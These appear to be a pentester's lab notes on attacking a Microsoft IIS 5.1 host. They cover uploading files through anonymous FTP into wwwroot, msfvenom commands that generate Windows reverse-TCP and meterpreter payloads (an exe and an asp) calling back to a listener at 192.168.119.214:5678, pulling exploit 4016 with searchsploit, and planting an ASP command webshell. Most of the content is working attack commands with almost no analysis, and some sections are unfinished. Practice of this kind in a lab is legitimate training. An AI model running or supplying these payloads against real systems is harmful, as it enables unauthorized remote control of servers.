Attack Vectors _ Searchsploit

Attack Vectors / Searchsploit

# Microsoft FTP
We are able to upload files from our attack machine /tmp/dir to the target's wwwroot directory using username anonymous without any password.It allows the put command to put any files in the wwwroot. When on a browser, we can read a .txt but cannot execute an .exe. Upload to the /Scripts directory, at least you can see the files. It won't allow to execute .exe but will let you download .php
![5b5788ccdfc6122c666c8bc51fa696f6.png](../../../_resources/39f2b240dcb742d5abef7b6db25bb3ad.png)

Create shellcode
`msfvenom -p windows/shell/reverse_tcp LHOST=192.168.119.214 LPORT=5678 -f exe > rev_shell_reverseTcp_192.168.119.214_5678.exe`
![21a5250e50c7902d138e810ebae41bb0.png](../../../_resources/16b6a1a3fd3d4b6a943ba34657a7fbfd.png)

Transfer the reverse shell to the /tmp dir
![3ef0cc7b524b82b4ad6120fed14e9b1e.png](../../../_resources/f5a8b5e38baa413d85e13b3193a3c192.png)




# Remote Desktop Web Connection

# Nikto scan
There are some interesting finds from Nikto that I havne't documented yet.

# Microsoft IIS 5.1
`searchsploit microsoft iis 5.1`
![5d477c6eee0d25e1a812fc78eb415619.png](../../../_resources/ccf07efbb714422dacfaa18c4a2aee2e.png)


# 4016 - Hit Highlighting Authentication Bypass
`searchsploit -m 4016`
This file comes with some CRLF line terminators. To get rid of them, run dos2unix file.sh
`dos2unix m4016.sh`
**Still need a screenshot of the dos2unix output**

###  Let's use an asp shell found in /usr/share/webshells/asp/cmd-asp-5.1.asp
It too must be adjusted when you see errors in linebreaks after trying to run it in browser. Here is the diff:
![ab56ab458e1f108ee9ce94fb8c918c99.png](../../../_resources/698ce8c211d44ad9a9e0109acbec8eb4.png)

### It must be transfered to wwwroot. Login as anonymous with no password, then use the put command to put it into the wwwroot directory
![e92a826753375a83b9f519be181a794f.png](../../../_resources/c9b58cf3fbef4c0a9e83641a5074ec91.png)


### Browse to the 
![c372b546ebc936aaae1a7aefb74bad6c.png](../../../_resources/648835eb658b4d86a1a56a18eab5fb89.png)


### What about meterpreter shell
`msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.119.214 LPORT=5678 -f asp > rev_windows_meterpreter_reverseTcp_192.168.119.214_5678_asp.asp`
![c91f0027026662949db6894265746793.png](../../../_resources/840d89e160c44a939ff7828f23b49b4c.png)


# ASP should we write asp code?
https://asp.net-tutorials.com/basics/hello-world/






